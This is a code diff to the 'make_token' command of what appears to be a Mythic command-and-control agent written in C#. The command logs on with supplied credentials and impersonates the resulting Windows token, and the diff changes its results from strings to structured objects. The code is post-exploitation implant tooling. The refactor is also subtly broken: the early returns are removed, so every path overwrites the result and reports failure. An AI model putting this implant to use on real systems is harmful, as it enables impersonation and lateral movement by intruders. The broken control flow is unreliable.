@@ -12,8 +12,10 @@ namespace Tasks.Commands
     {
         public override string Name => "make_token";
 
-        public override string Execute(MythicTask task)
+        public override MythicTaskResult Execute(MythicTask task)
         {
+            MythicTaskResult result;
+
             var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<MakeTokenParam>();
 
             var split = Arguments.username.Split('\\');
@@ -28,13 +30,36 @@ namespace Tasks.Commands
                 if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
                 {
                     var identity = new WindowsIdentity(hToken);
-                    return $"Successfully impersonated {identity.Name}";
+                    //return $"Successfully impersonated {identity.Name}";
+                    result = new MythicTaskResult
+                    {
+                        task_id = task.id,
+                        user_output = $"Successfully impersonated {identity.Name}",
+                        completed = true,
+                        status = "success"
+                    };
                 }
 
-                return $"Successfully made token, but failed to impersonate";
+                result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = $"Successfully made token, but failed to impersonate",
+                    completed = true,
+                    status = "Error",
+                    error = "Failed to impersonate token"
+                };
             }
 
-            return "Failed to make token";
+            result = new MythicTaskResult
+            {
+                task_id = task.id,
+                user_output = "Failed to make token",
+                completed = true,
+                status = "Error",
+                error = "Failed to create token"
+            };
+
+            return result;
         }
     }
 
